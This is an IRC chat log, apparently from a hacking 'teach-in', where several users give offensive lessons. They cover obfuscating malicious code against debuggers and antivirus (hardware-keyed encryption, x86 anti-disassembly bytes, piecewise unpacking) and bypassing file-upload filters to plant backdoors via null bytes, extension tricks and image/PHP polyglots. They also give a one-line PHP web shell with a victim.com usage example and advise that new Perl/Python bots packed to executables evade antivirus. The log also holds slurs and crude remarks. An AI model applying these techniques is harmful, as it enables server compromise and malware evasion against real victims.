[03:57.24] <hatter> that'll echo the base64 back out to you
[03:57.39] <hatter> so now
[03:57.41] <hatter> if you want to execute that
[03:57.45] <Laurelai> where kayla at
[03:58.05] <xo> Laurelai: idk :[
[03:58.17] <hatter> http://pastebin.com/eJ03eSvz
[03:59.05] <hatter> now
[03:59.07] <hatter> this is kinda garbage
[03:59.15] <hatter> because we're defining the key
[03:59.17] <hatter> all obvious
[03:59.20] <hatter> and stuff
[03:59.23] <hatter> so
[03:59.29] <hatter> there's a few things specific to a machine
[03:59.41] <hatter> you can use a few different data sources
[03:59.44] <hatter> to construct your key
[03:59.47] <hatter> when you're first encoding it
[03:59.53] <hatter> there's simple things, and not so simple things
[04:01.24] <hatter> for example, you could generate the key from hashes of the amount of ram in the pc combined with the size of certain partitions
[04:01.30] <hatter> but that's not gonna be really helpful
[04:01.39] <hatter> something hardware layer
[04:01.41] <hatter> is the best
[04:01.51] <hatter> because then it won't decrypt without being on the exact same hardware
[04:02.16] <hatter> oh guys
[04:02.22] <hatter> because I'm getting requests
[04:02.23] <hatter> I'd like to say this
[04:02.29] <hatter> I WILL NOT HELP YOU HACK ANYTHING
[04:02.33] <hatter> I WILL TEACH YOU ABOUT INTRUSION
[04:02.38] <hatter> YOUR HAX ARE YOUR OWN
[04:02.44] <hatter> <3
[04:02.46] <hatter> Anyway
[04:02.52] <Laurelai> and the conciquences are yours as well
[04:02.56] <hatter> ^
[04:03.09] <xo> THE CONSEQUENCES WILL NEVER BE THE SAME
[04:03.28] <xo> sry i couldnt resist
[04:03.31] <Laurelai> lol
[04:04.02] <hatter> all good.
[04:04.47] <hatter> Sec, I'm lookin for somethin specific
[04:05.16] <hatter> but yeah
[04:05.20] <hatter> you should construct your key
[04:05.21] <hatter> based on the hardware
[04:05.51] <hatter> you could read mac addresses from network devices
[04:05.52] <hatter> etc
[04:05.52] <hatter> to construct the key
[04:05.53] <hatter> then hash it
[04:06.15] <hatter> as long as your key is constructed the same way in the encryptor as well as the decryptor
[04:06.16] <hatter> its not a big deal
[04:06.32] <hatter> now you can re-encode that whole code to base64 if you like
[04:06.42] <hatter> n get it all on one line
[04:06.51] <hatter> or even encode the encrypted code
[04:06.52] <hatter> in base64
[04:06.59] <hatter> n then decrypt the decoded base64
[04:07.03] <hatter> so you can keep it all in one file
[04:07.50] <hatter> Now, moving on
[04:07.59] <hatter> mcrypt is also compatible with C/C++
[04:08.03] <hatter> and a variety of other languages
[04:08.13] <hatter> The same theory applies to each of these
[04:08.19] <hatter> except for assembly
[04:08.25] <hatter> the best way to obfuscate assembly
[04:08.29] <hatter> is to do it by hand
[04:08.49] <hatter> I'll take some questions before we go there though
[04:09.02] <hatter> ...
[04:09.34] <Backslash> hatter, may I say that your PHP is beautiful :-)
[04:09.40] <FoxInSocks497> HEY GUYS! IM A FOX IN SOCKS!
[04:09.59] <hatter> That's not even enough code to call it beautiful
[04:10.04] <hatter> but ok thanks
[04:10.04] <hatter> lol
[04:10.19] <Kayel> I agree with Backslash :)
[04:10.27] <Gariono> i ahve a question
[04:10.33] <Kayel> Beautiful and fluent
[04:10.34] <Backslash> Using `cat file` to involk shell - I hardly ever do that, I probably should
[04:10.36] <hatter> go for it
[04:10.36] <Fox> Back
[04:10.53] <Duder> Damn, did I miss the guest speaker?
[04:10.56] <FoxInSocks824> hey sup
[04:10.57] <FSB> any sql haxx0rs here?
[04:11.03] <hatter> <---
[04:11.08] <hatter> xo: I think we need to re-address web apps
[04:11.11] <hatter> again
[04:11.14] <hatter> bevause
[04:11.16] <hatter> *because
[04:11.18] <hatter> I am getting questions
[04:11.22] <hatter> about them
[04:11.23] <hatter> still.
[04:11.24] <Gariono> if you have for example different servers with different hardware, which method should be used for key if for example one server needs a hardware replacement
[04:11.31] <Fox> Hatter check pm
[04:11.31] <FSB> hatter, do you know http://84.23.65.183/hackit/ ?
[04:11.49] <hatter> call me Fox
[04:11.53] <hatter> FSB: no
[04:11.56] <hatter> FSB: should I look at it?
[04:11.58] <Gariono> so the hardware changes while the key is based on the current hardware
[04:12.21] <FSB> well, I and some other guys from #germany were trying it earlyer but we are stuck at lvl 5
[04:12.36] <Fox> Will do
[04:12.44] <MrBoter> hey guys
[04:12.45] <MrBoter> sup
[04:12.45] <towq> there is no level 6
[04:12.51] <hatter> FSB: lemme look at it
[04:13.29] <Gariono> @hatter if you have for example different servers with different hardware, which method should be used for key if for example one server needs a hardware replacement. so the hardware changes while the key is based on the current hardware
[04:13.30] <FSB> if you want I can msg you the key for lvl 5
[04:14.09] <hatter> Gariono: well
[04:14.11] <hatter> don't base it on something that would change
[04:14.16] <hatter> for example
[04:14.20] <hatter> pull the serial # off of the USB bus
[04:14.28] <hatter> i doubt that'll change
[04:14.31] <xo> hatter: haha ikr?
[04:14.40] <xo> i feel like we've talked about all the web app shit
[04:14.42] <xo> like at lteast twice
[04:14.46] <hatter> people don't even use USB on servers
[04:14.51] <hatter> but there's usually still a usb bus there
[04:14.52] <towq> so when the server goes bewm
[04:14.56] <towq> your backups are all useless
[04:14.57] <towq> yay
[04:15.09] <xo>  who let
[04:15.10] <hatter> well
[04:15.12] <xo> towq back in
[04:15.13] <xo> ?
[04:15.19] <xo> lol
[04:15.23] <towq> i learn of the magical /join
[04:15.29] <xo> sounds l33t
[04:15.29] <hatter> well
[04:15.32] <turbopinko> you can just /j
[04:15.35] <turbopinko> pro tip
[04:15.38] <xo> owned
[04:15.38] <xo> lulz
[04:15.39] <xo> so leet
[04:15.39] <hatter> if you're obfuscating your code
[04:15.43] <hatter> I'm not sure you'd want working backups of it
[04:15.46] <towq> chatzilla mayne
[04:15.47] <hatter> you should have the plaintext unobfuscated code
[04:15.49] <hatter> and just recrypt it
[04:15.53] <hatter> so
[04:15.58] <hatter> ionno why that'd be an issue
[04:16.02] <towq> that is far too simple
[04:16.06] <hatter> same with changing hardware, really
[04:16.06] <towq> it must be complex
[04:16.08] <Gariono> @hatter Thanks
[04:16.28] <m4tr1c3s> lol
[04:16.32] <hatter> sorry.

[05:19.44] <MrThePlague> :3
[05:19.48] <MrThePlague> <3~
[05:20.02] <hatter> ok guys
[05:20.09] <hatter> Who knows what out of order code execution is?
[05:20.32] <hatter> Out of order code execution occurs when bytes are skipped with a goto or jmp to an unlabeled offset of space.
[05:20.49] <hatter> Bytes that are parsed as operands by the debugger may become instructions
[05:21.01] <hatter> and instruction bytecodes may also become operands
[05:21.13] <hatter> this is especially handy if attempting to detect breakpoints ;)
[05:21.32] <hatter> so
[05:21.38] <hatter> The 'jmp short'
[05:21.43] <hatter> call to a relative offset
[05:21.45] <hatter> in machine code
[05:21.49] <hatter> is \xeb
[05:22.04] <hatter> this is important, as you'll need to know the bytecodes
[05:22.11] <hatter> for the code we're modifying
[05:22.32] <hatter> we're not actually modifying code
[05:22.36] <hatter> meh
[05:22.38] <hatter> anyway
[05:22.40] <hatter> so
[05:22.48] <hatter> in all ascii
[05:22.49] <hatter> you can zero out eax
[05:22.52] <hatter> in 5 bytes
[05:22.59] <hatter> this is especially handy
[05:23.09] <hatter> j = push byte
[05:23.44] <hatter> X = pop eax
[05:23.49] <hatter> so in this case
[05:23.53] <hatter> jXX
[05:23.54] <hatter> is
[05:23.56] <hatter> push byte 'x'
[05:23.58] <hatter> pop eax
[05:24.08] <hatter> '4'
[05:24.08] <hatter> also 0x34
[05:24.15] <hatter> is the xor al instruction
[05:24.16] <hatter> the next byte
[05:24.21] <hatter> is its operand
[05:24.21] <hatter> so
[05:24.25] <hatter> jXX4X
[05:24.29] <hatter> and you have a nulled eax
[05:24.44] <hatter> this is also 5 bytes, making it pretty convenient
[05:24.47] <hatter> now
[05:24.54] <hatter> if you put 3 bytes
[05:24.56] <hatter> right at the beginning
[05:25.03] <hatter> \xeb\x01\x6a
[05:25.08] <hatter> also the same as
[05:25.13] <hatter> \xeb\x01j
[05:25.18] <hatter> rather
[05:25.24] <hatter> that should be \x68 and h
[05:25.24] <hatter> my fault
[05:25.39] <hatter> \xeb\x01hjXX4X
[05:25.47] <hatter> h is 0x68, or the `push dword' instruction
[05:25.58] <hatter> so if an in-line debugger, such as gdb, or ollydbg
[05:26.01] <hatter> parses the code
[05:26.05] <hatter> at pre-run
[05:26.07] <hatter> it will look like this :
[05:26.11] <hatter> jmp 0x01
[05:26.22] <hatter> push 0x6a585834
[05:26.24] <hatter> pop eax
[05:26.41] <hatter> apon looking at that code in a debugger
[05:26.56] <hatter> most people would believe that the value of eax once the code is executed is 0x6a585834
[05:27.01] <hatter> when in fact, it is zero
[05:27.07] <hatter> as the 0x68 instruction is skipped over
[05:27.13] <hatter> and it starts executing at the 0x6a
[05:27.27] <hatter> so you get \x6a\x58\x58\x34\x58
[05:27.34] <hatter> the same as jXX4X
[05:27.41] <hatter> and it zeroes out eax
[05:27.48] <hatter> so the code lies to the analyst
[05:27.51] <hatter> in that particular case
[05:28.38] <Fox> Hatter makes computers lie.
[05:29.02] <Fox> HATTER MAKES COMPUTERS PERJURE THEMSELVES.
[05:29.23] <Fox> Fuck you. Get at my nigga hatter. >.<
[05:29.43] <hatter> (this is why a lot of professional analysts do not use in-line debuggers)
[05:29.49] <hatter> other tricks
[05:29.51] <hatter> once your code is functional
[05:29.52] <hatter> you can slice up functions
[05:29.53] <hatter> and re-arrange all the code
[05:29.53] <hatter> and relabel
[05:29.53] <hatter> and jump forward and back
[05:29.54] <hatter> etc
[05:29.54] <hatter> this will make it a little harder to trace the assembly itself by hand
[05:29.54] <hatter> simply randomizing this effect is a good tactic for bypassing on-disk malware scans
[05:29.54] <hatter> assuming you had a false positive.
[05:30.44] <Fox> Hatter that open forum?
[05:30.54] <hatter> any questions thus far?
[05:31.02] <Special-G> and this is?

[05:31.32] <Fox> obviously.
[05:31.33] <Zekiel> read the desc bro

[05:32.14] <Bratty> nick shoulda been Special-ed
[05:32.15] <Bratty> heh
[05:32.19] <Special-G> i did
[05:32.28] <Fox> YES I AM.
[05:32.46] <Special-G> 12 hour lesson on what
[05:32.54] <Fox> we've been doing 12 hours
[05:32.54] <lunivz> dissecting frogs
[05:32.56] <Fox> of teaching so far
[05:32.58] <ES> oh this is nice m off i forgot all the witty things i typed tho ;)
[05:33.02] <r00t00r> the intertubes
[05:33.03] <Fox> on hacking, net sec, all sorts of shit
[05:33.04] <m4tr1c3s> how many times have I heard this...
[05:33.08] <Fox> Cooking
[05:33.08] <Special-G> i se
[05:33.08] <Fox> fucking
[05:33.10] <Special-G> see*
[05:33.12] <ES> knitting
[05:33.15] <Fox> hacker shit in general
[05:33.19] <ES> got a sweet link earlier
[05:33.25] <c0s> Fox: next topic, the g-spot.
[05:33.30] <Zekiel> hatter, this order of code depends of the type of proccesor? or every processor do that?
[05:33.36] <xplicit> Fox: is the other irc server still active?
[05:33.38] <ES> PERFECT it must be g-spot
[05:33.42] <derpfish> I'd love to talk about filter bypasses through filesystem weirdness
[05:33.46] <Kayel> It's 10:33 hours of teaching :)
[05:33.50] <Fox> Yep.
[05:33.51] <Special-G> good place to start for begineer hacker lol?
[05:33.55] <Fox> 10:33 and moving
[05:34.00] <hatter> Zekiel: that was specifically x86
[05:34.01] <lolwhataboutefnet> library
[05:34.03] <Fox> Sabu is getting ready for his piece i think
[05:34.05] <Kayel> I got one tut for the G-spot

[05:43.50] <hatter> depending on your architecture
[05:44.01] <hatter> (32 or 64 bit)
[05:44.14] <hatter> you'll want to break your code into 4 or 8 byte chunks (respectively)
[05:44.42] <hatter> then shove push in front of each one
[05:44.46] <hatter> drop it backwards
[05:44.50] <hatter> use tac in stead of cat

[05:45.42] <hatter> basically you're shoving esp onto the stack as the return pointer
[05:45.49] <hatter> and returning to the code you've pushed onto the stack.
[05:46.02] <hatter> this technique is important because you can write a loop
[05:46.06] <hatter> to encrypt/decrypt your code
[05:46.11] <hatter> shove it all onto the stack
[05:46.11] <hatter> push esp
[05:46.11] <hatter> ret
[05:46.26] <hatter> and you'll execute your decrypted code
[05:46.40] <hatter> now
[05:46.42] <hatter> lets take this a little firther
[05:46.44] <hatter> *further
[05:46.49] <hatter> into ritomorphism
[05:46.57] <hatter> ritomorphism.
[05:46.59] <hatter> who knows what that is?
[05:47.09] <derpfish> >nope.avi
[05:47.19] <hatter> lol
[05:47.19] <hatter> wow
[05:47.20] <Bld-Fedex> :cric:
[05:47.21] <hatter> im surprised
[05:47.24] <m4tr1c3s> shape
[05:47.30] <m4tr1c3s> shaping...
[05:47.31] <m4tr1c3s> something
[05:47.33] <m4tr1c3s> lol
[05:47.39] <FoxInSocks041> ritomorphism doesnt exist
[05:47.40] <hatter> ok
[05:47.47] <hatter> ok
[05:48.12] <hatter> obvious troll is obvious.
[05:48.12] <hatter> FoxInSocks041:
[05:48.12] <SuShi> ritomorphism?
[05:48.16] <hatter> yeah
[05:48.23] <FoxInSocks041> does not exist
[05:48.24] <SuShi> what is it hatter?
[05:48.55] <hatter> ritomorphic code is code that only decrypts chunks of itself at a time
[05:49.04] <hatter> as opposed to its entire functionality
[05:49.04] <hatter> for example
[05:49.08] <hatter> you have 10 functions
[05:49.18] <hatter> your _start only calls these functions and uses return data
[05:49.26] <hatter> you can safely unpack a single function at a time
[05:49.31] <hatter> preserve the return data
[05:49.38] <hatter> and destroy the unpacked function
[05:49.49] <hatter> each function call
[05:50.06] <Fox> So
[05:50.07] <Fox> hatter
[05:50.16] <Fox> am I able to start getting lit
[05:50.26] <Fox> and start the fox-shit-show during intermissions?
[05:50.37] <hatter> eh?
[05:50.42] <hatter> plz dont
[05:50.44] <hatter> lol
[05:51.03] <hatter> so
[05:51.04] <hatter> this way
[05:51.10] <hatter> if you only unpack
[05:51.10] <hatter> functions at a time
[05:51.13] <hatter> or chunks of code
[05:51.16] <hatter> versus the entire thing
[05:51.18] <hatter> and wipe'em out
[05:51.23] <hatter> you sacrifice some performance
[05:51.27] <hatter> but
[05:51.31] <Fox> COME ON
[05:51.32] <Fox> PLEASE
[05:51.36] <Fox> not trying to interrupt
[05:51.36] <hatter> Your code is more obfuscated than someone running it
[05:51.41] <hatter> and taking a little RAM snapshot
[05:52.03] <hatter> and pewf even your packed code is there for all to see
[05:52.25] <hatter> since it got unpacked all at once
[05:52.31] <hatter> in stead of on an as needed basis
[05:52.39] <hatter> and unused functions are left laying around in ram
[05:52.48] <hatter> seeing this in the wild is rare
[05:52.52] <hatter> and it is not well documented
[05:53.02] <hatter> but you will see it in the wild from time to time.
[05:53.10] <m4tr1c3s> that is cool :)
[05:53.18] <yngjungian> ^
[05:53.19] <MrThePlague> brb patching gcc

[05:53.52] <hatter> n then wiping out everything but return data
[05:53.55] <m4tr1c3s> could you do the same thing with higher-level languages?
[05:54.01] <hatter> sure.
[05:54.21] <Fox> SO HATTER

[06:01.08] <derpfish> Epic knowledges to drop
[06:01.14] <derpfish> At least useful knowledges
[06:01.20] <harrier> If anyone interested I can give an IPv6 tutorial?
[06:01.38] <hatter> harrier: go for it
[06:01.50] <m4tr1c3s> I am interested.
[06:01.51] <Zekiel> omg fuck this #opfacebook
[06:01.59] <Fox> Also
[06:02.03] <Fox> Before Harrier goes
[06:02.13] <Fox> Any of you with a problem with me?
[06:02.16] <Fox> Suck my dick.
[06:02.23] <Fox> Harrier, the floor is yours.
[06:02.24] <harrier> Ipv6 is twice as nice as iov4
[06:02.30] <MrThePlague> lol
[06:02.35] <MrThePlague> 5P5r4o4b7l7e8m8?
[06:02.47] <Fox> No, just announcing :D
[06:02.50] <harrier> 128bit addrss space
[06:02.52] <derpfish> Lies, government conspiracy, ipv6 is an evil plot to end the world
[06:03.06] <harrier> derpfish: true!
[06:03.07] <turbopinko> ipv6 is the suck
[06:03.11] <hatter> let harrier talk.
[06:03.18] <hatter> when he's done
[06:03.20] <hatter> I'll say my thoughts
[06:03.21] <MrThePlague> ipv6 goes live 2012
[06:03.24] <hatter> on ipv6
[06:03.33] <turbopinko> um its live now nnigga
[06:03.36] <harrier> Ipv6 also has jumbo grams
[06:04.13] <harrier> Which can address 16 bit data
[06:04.41] <harrier> So ipv6 can haul 2GB of data in a packet
[06:05.09] <harrier> Networks are not up to that yet though
[06:05.34] <hatter> some fiber ones are.
[06:05.41] <harrier> 40GB is current max for fibre optic
[06:05.45] <MrThePlague> 2gb is a big ass packet :x
[06:05.54] <turbopinko> ^^
[06:06.08] <harrier> MrThePlague: yes think of the possibilities
[06:06.23] <harrier> MrThePlague: movies in 3 seconds
[06:06.34] <JackofCoins> So do ISP's update to IPv6 or is it DNS software on our routers?
[06:06.43] <harrier> That's it for tonight
[06:06.51] <MrThePlague> harrier: SUPER HIGH DEF.AVI.MP3.FLAC
[06:07.22] <harrier> JackofCoins: software in routers is up graded
[06:07.51] <harrier> All cisco, juniper, force10 etc.... All do V6
[06:08.45] <harrier> Was that any use?
[06:09.10] <harrier> Who wants to take the mic now?
[06:10.34] <derpfish> I'll take the mic if you're finished
[06:10.50] <harrier> derpfish: by all means
[06:10.57] <derpfish> Thanks muchly.
[06:11.12] <derpfish> So I'd like to talk about filter bypass. Some of this you might have heard, other stuff, maybe not.
[06:11.31] <derpfish> This will be focused on filter bypass in web applications, but some of these tricks apply elsewhere
[06:11.47] <derpfish> First, let's say that we have a file upload script
[06:12.08] <derpfish> And we need to trick it into letting us upload code so that we have a backdoor on the server
[06:12.35] <derpfish> Most upload scripts have some sort of protection against this, mostly we're talking about string based comparison
[06:13.04] <derpfish> The application will most commonly look at the end of the filename and compare it against a set of "bad" extensions
[06:13.23] <derpfish> This isn't enough.
[06:13.51] <derpfish> The simplest bypass is to try a different extension.
[06:14.10] <derpfish> If we can't upload php files, we might be able to upload with a different PHP extension
[06:14.18] <derpfish> Such as php3 or php4 or phtml
[06:14.40] <derpfish> All are valid PHP extensions, and if any of them are missed we can still upload code.
[06:14.52] <derpfish> Let's say all the extensions are blocked.
[06:15.09] <derpfish> Another mistake which can be made is to check the extension in a case sensitive way.
[06:15.24] <hatter> ^
[06:15.30] <derpfish> Case sensitivity means that "php" is not the same as "Php"
[06:15.58] <derpfish> So if we upload shinydolphin.php
[06:16.08] <derpfish> It might be blocked when shinydolphin.Php isn't
[06:16.13] <JackofCoins> Not the same to the php interpreter on the server, or the ftp server?
[06:16.29] <derpfish> Not the same to the php interpreter on the server
[06:16.44] <derpfish> If it's an FTP server, it would depend on the backend system
[06:16.53] <derpfish> On Windows systems, there is no case sensitivity
[06:17.01] <derpfish> On Unix-based systems, there is
[06:17.07] <derpfish> Any questions so far?
[06:17.29] <harrier> All sounds good!
[06:17.39] <derpfish> Great. Let's get a bit crazy.
[06:18.14] <derpfish> Null bytes, 0x00, are used as string terminators
[06:18.20] <derpfish> But only in certain languages
[06:18.46] <derpfish> When you upload a file to a web site, you're interacting with the Web application *and* the OS
[06:19.05] <hatter> ^
[06:19.31] <derpfish> In C based languages, the null byte is a terminator. In many others, especially interpreted languages as web application languages tend to be, it is not.
[06:19.44] <derpfish> Sorry, what's the ^ about?
[06:20.21] <JackofCoins> I think it means *agree*
[06:20.25] <derpfish> Ah, gotcha
[06:20.51] <derpfish> Let's say we upload a file as "file.php%00.txt"
[06:21.22] <derpfish> The web application will see the whole string, because the null byte will not end the string.
[06:21.44] <derpfish> The file is then accepted because it ends in ".txt" and is placed on the server
[06:22.07] <derpfish> Once it is used by the operating system, though, the string ends at the null byte. Thus, the filename becomes "file.php" on the server.
[06:22.17] <hatter> ^
[06:22.27] <xo> ??????????????? ????? ???????????????
[06:22.30] <xo> ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Repost this if ~ ~ ~ ~ ~ ~ ~ ~ ~

[06:22.38] <xo> ??????????????? ????? ???????????????
[06:22.45] <derpfish> This is known as a "poison null byte" attack and it works on a lot of different setups
[06:22.48] <hatter> xo: wtf.
[06:23.03] <osaka> :D
[06:23.09] <derpfish> I don't know about you guys, but I'm certainly a beautiful strong black woman
[06:23.13] <hatter> derpfish: continue
[06:23.17] <derpfish> :)
[06:23.17] <JackofCoins> thats very interesting is %00 the specific one we would use? Or how do you know the Nullbyte to use?
[06:23.19] <MrThePlague> xo: same
[06:23.21] <Fox> Reposted.
[06:23.32] <hatter> JackofCoins: %00.
[06:23.41] <derpfish> The null byte is the string terminator character in C based languages
[06:23.48] <derpfish> Specifically, 0x00
[06:23.55] <derpfish> Or in URL encoding, %00
[06:24.15] <derpfish> All the common operating systems are written in C based languages
[06:24.25] <JackofCoins> Oh ok I see now I was just wondering how you got the %00.
[06:24.26] <harrier> derpfish: how do you know what sh
[06:24.48] <derpfish> You don't need to know what sh, they all use the same libraries
[06:25.17] <harrier> derpfish: system to attack, should is process web pages with php extensions on the server
[06:25.43] <derpfish> That's something you need to determine by looking at what applications are already on the server
[06:25.56] <harrier> derpfish: ic
[06:25.58] <derpfish> You can also try requesting various file extensions from the server
[06:26.08] <hatter> ^
[06:26.15] <hatter> oh also
[06:26.19] <hatter> apparently
[06:26.22] <derpfish> For instance, if ASP.NET is installed, you'll get a different error from requesting a .aspx file that doesn't exist than you will with any other
[06:26.29] <c0s> derpfish: any chance you could show a live example for people when your done?
[06:26.29] <hatter> session splicing evades apache mod_security on certain configs
[06:26.33] <hatter> I found this out by accident
[06:26.34] <hatter> but kind of cool
[06:26.36] <hatter> just thought I'd mention.
[06:26.51] <derpfish> c0s: haven't got one handy, sorry :(
[06:27.07] <c0s> no need to apologize, your doing great, ignore me and keep going :)
[06:27.39] <hatter> derpfish: keep goin <3
[06:27.50] <derpfish> :)
[06:28.01] <derpfish> So, let's get crazier
[06:28.10] <derpfish> We're going to talk Windows-specific shit now
[06:28.21] <derpfish> This isn't terribly well known either
[06:28.36] <derpfish> Windows has a funny way of processing file names
[06:29.07] <derpfish> Any time a file path or file name with periods or spaces at the end is used, the periods and/or spaces get thrown away
[06:29.32] <derpfish> So trying to open "file.txt" is the same as opening "file.txt...." or "file.txt    "
[06:30.07] <derpfish> This is so poorly known that even Web servers have had it wrong in recent times
[06:30.27] <derpfish> nginx for instance would allow you to view the source of any file on a Windows platform by putting a space on the end
[06:30.39] <hatter> ^
[06:30.56] <hatter> because windows = winblows
[06:30.57] <hatter> just saying.
[06:31.03] <derpfish> Doesn't matter if you're reading, writing, deleting, creating, appending to a file
[06:31.27] <derpfish> Windows throws away those periods and spaces just because, and does so silently without warning or error
[06:31.45] <derpfish> So "file.php" might be a no go
[06:32.04] <derpfish> But if we upload "file.php." the extension is a null extension
[06:32.13] <derpfish> Which might be just dandy with the web app
[06:32.25] <derpfish> But once it's placed on the file system, the period is discarded
[06:32.47] <derpfish> Any questions so far?
[06:33.18] <derpfish> Lovely!
[06:33.42] <derpfish> Next, let's talk about cross-site scripting attacks
[06:33.54] <harrier> derpfish:  would the contents of file.php be very complex to enable a back door?
[06:34.03] <MrThePlague> 5h5a4t4t7e7r8 8<93
[06:34.04] <derpfish> Nope, you can do it in one line
[06:34.25] <osaka> gesdghvcjxk
[06:34.38] <derpfish> <?php echo system($_GET['cmd']); ?> would take the "cmd" variable in the url and run it as a system command, then show the output.
[06:34.56] <Fox> hatter
[06:35.00] <JackofCoins> wow
[06:35.01] <Fox> you got this man?
[06:35.09] <harrier> derpfish: wow that is mad!
[06:35.36] <derpfish> Yeah, as long as you can access the script an insecure file upload is pure comedy gold
[06:35.37] <JackofCoins> so it would look like http://yourwebsitehere.com/file.php?COMMAND?
[06:35.55] <derpfish> http://victim.com/uploads/file.php?cmd=ls
[06:36.03] <hatter> back
[06:36.04] <hatter> sorry
[06:36.05] <hatter> was afk
[06:36.32] <harrier> hatter: pissing ;-)
[06:36.35] <JackofCoins> thats cool so its like an unsecured sh over web
[06:36.50] <derpfish> Yes. If you know more PHP you can do more fancy stuff
[06:37.02] <MrThePlague> it's like 'oh my box got raped, but it was so loose i didn't feel it'
[06:37.02] <Fox> Hatter
[06:37.04] <turbopinko> so learn php got it
[06:37.05] <Fox> You good
[06:37.13] <Fox> I need sleep.
[06:37.19] <derpfish> That simple example will get flagged by some AV but trivial modifications will break detection
[06:37.50] <derpfish> For instance, avoid variable names like "command" or "cmd"
[06:37.58] <hatter> im good
[06:38.01] <Fox> Word
[06:38.07] <derpfish> Instead, use "sparklinghorsies" or something
[06:38.27] <Fox> SPARKLE
[06:38.28] <Fox> FUCK
[06:38.31] <Fox> HORSIES
[06:38.37] <Fox> G'night.
[06:38.40] <Fox> 12 hours.
[06:38.41] <JackofCoins> or something that sounds like their phpbb or drupal site stuff
[06:38.43] <Fox> Fuck you.
[06:39.01] <harrier> derpfish: great stuff I'm off to bed, it's 5am here
[06:39.02] <JackofCoins> lol
[06:39.05] <Fox> Also, we hit 12 hours like
[06:39.09] <Fox> 11 minutes ago
[06:39.15] <derpfish> \m/
[06:39.17] <Fox> Congrats kids.
[06:39.26] <derpfish> Let's make it 13 hours
[06:39.35] <JackofCoins> Im down lol
[06:40.15] <harrier> derpfish: hope fully I'll get a shag off the wife before I get some shut eye:-)
[06:40.16] <hatter> oh
[06:40.20] <hatter> keep pushing guys
[06:40.24] <hatter> whenever you guys are done
[06:40.25] <hatter> I got more to say
[06:40.26] <hatter> so like
[06:40.27] <hatter> GO GO GO
[06:40.38] <derpfish> Let's talk about another method of protecting file uploads
[06:40.51] <turbopinko> hacking with python
[06:40.53] <derpfish> Checking file properties
[06:41.16] <turbopinko> more so
[06:41.29] <turbopinko> practical uses
[06:41.31] <derpfish> Let's say you check to make sure that the uploaded file is really a JPEG file
[06:41.34] <Laurelai> oh
[06:41.37] <hatter> let derpfish talk.
[06:41.38] <Laurelai> i got a mini class
[06:41.43] <hatter> let derpfish talk.
[06:41.43] <Laurelai> later
[06:41.46] <hatter> let derpfish talk.
[06:41.46] <hatter> let derpfish talk.
[06:41.46] <hatter> let derpfish talk.
[06:41.47] <hatter> let derpfish talk.
[06:41.48] <Laurelai> ok sry
[06:41.51] <hatter> :D
[06:41.51] <derpfish> <3 hatter
[06:42.04] <hatter> Can't wait for it Laurelai & turbopinko
[06:42.04] <hatter> <3
[06:42.10] <osaka> Laurelai: o:
[06:42.10] <hatter> go ahead derpfish
[06:42.16] <derpfish> So what you may not know is that a file can be more than one format at once
[06:42.32] <derpfish> It depends on the formats it's being read as
[06:42.55] <derpfish> For instance, to go back to the PHP example, PHP scripts can be anything
[06:43.03] <Laurelai> osaka: do i know you?
[06:43.17] <osaka> i thought so
[06:43.17] <derpfish> If there's an example of <?php and ?> in the file, what's between them is parsed and run
[06:43.38] <derpfish> Most image formats put comments directly in the file
[06:43.46] <derpfish> Not encoded or anything
[06:44.14] <derpfish> So if you make a GIF, JPEG, PNG, whatever with the GIMP and put a php script as a comment, the file is both a valid image and PHP script
[06:44.42] <derpfish> http://www.slideshare.net/SOURCEConference/dan-crowley-jack-of-all-formats <-- more on that
[06:45.59] <derpfish> I think I'd like to take a little break
[06:46.10] <derpfish> I have more stuff to share, but I'll let someone else take the mic for a bit
[06:46.31] <JackofCoins> Thanks for the talk
[06:46.34] <derpfish> My pleasure.
[06:46.39] <c0s> that was great stuff
[06:47.15] <derpfish> More where that came from :D
[06:47.35] <derpfish> Anyone else want to go?
[06:47.51] <n0de> fuck i'm ready to go home
[06:47.53] <derpfish> If not, I'll get more beer in me and keep going
[06:47.57] <hatter> Sure
[06:47.59] <JackofCoins> laureli?
[06:48.04] <hatter> I think Laurelai can go
[06:48.16] <derpfish> Yeah Laurelai, drop some knowledge
[06:48.42] <turbopinko> she probabry doenst wanna now
[06:49.05] <Laurelai> ok
[06:49.08] <MacGyverr> whats cracken
[06:49.08] <JackofCoins> turbo didnt you want to go too
[06:49.10] <Laurelai> this is quick and dirty
[06:49.14] <turbopinko> no i was asking a question
[06:49.17] <turbopinko> lulz
[06:49.24] <JackofCoins> yay dirty errybody likes durty
[06:49.24] <Laurelai> but
[06:49.29] <Laurelai> this is about malware
[06:49.33] <Laurelai> and writing it
[06:49.38] <Laurelai> now
[06:49.41] <Laurelai> most malware
[06:49.47] <Laurelai> most of the time
[06:49.56] <Laurelai> is the same shit someone wrote 10 years ago
[06:49.59] <Laurelai> with a new crypter
[06:50.04] <Laurelai> now
[06:50.08] <Laurelai> if you know
[06:50.08] <Laurelai> perl
[06:50.10] <hatter> truth.
[06:50.11] <Laurelai> or python
[06:50.23] <Laurelai> you can write some simple irc bots
[06:50.26] <Laurelai> that can do whatever
[06:50.29] <Laurelai> and use
[06:50.31] <Laurelai> perl2exe
[06:50.39] <Laurelai> or the equivalent for python
[06:50.48] <Laurelai> and you have a brand new virus
[06:50.48] <JackofCoins> its just py2exe
[06:50.53] <Laurelai> and its going to be fud
[06:50.55] <osaka> ive been thinkin of codin a bot
[06:50.57] <osaka> P:
[06:50.57] <Laurelai> cause its new
[06:51.13] <Laurelai> just something to consider kids
[06:51.16] <Laurelai> av engines
[06:51.17] <Laurelai> suck
[06:51.24] <JackofCoins> av?
[06:51.25] <Laurelai> and you should always use whitelists
[06:51.29] <Laurelai> antivirus
[06:51.32] <JackofCoins> oh antivirus?
[06:51.37] <JackofCoins> lol
[06:51.55] <Laurelai> so
[06:51.55] <garrett> AV is a joke.
[06:51.58] <JackofCoins> So does perl2exe etc just encode the thing differently?
[06:52.12] <Laurelai> JackofCoins: it makes the perl script a standalone exe
[06:52.31] <JackofCoins> Yea but how does an old virus become a new crypt via that method
[06:52.33] <Laurelai> its new
[06:52.38] <Laurelai> so it doesnt need a crypter
[06:52.44] <Laurelai> no sig for it
[06:52.49] <garrett> Ehh, you are confusing crypter with packer jack
[06:52.50] <hatter> ^
[06:52.57] <hatter> well
[06:52.58] <hatter> either or
[06:53.03] <derpfish> JackofCoins: As I mentioned about trivial modifications to the backdoor script evading antivirus, same is true with the method Laurelai is speaking of
[06:53.03] <hatter> tbh
[06:53.05] <garrett> if you can even call perl2exe a "packer"
[06:53.16] <JackofCoins> oh ok
